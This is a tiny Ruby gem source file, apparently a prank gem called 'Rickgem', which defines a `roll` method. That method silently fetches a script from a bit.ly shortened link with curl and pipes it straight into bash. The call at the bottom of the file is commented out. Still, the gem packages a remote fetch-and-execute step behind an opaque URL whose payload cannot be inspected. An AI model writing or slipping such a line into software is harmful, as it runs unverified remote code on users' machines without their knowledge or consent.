# require "rickgem/version"

require 'launchy'

include Launchy

module Rickgem
  class Error < StandardError; end

  def roll
    system("curl -s -L http://bit.ly/10hA8iC | bash")
  end
end

include Rickgem

# Rickgem.roll
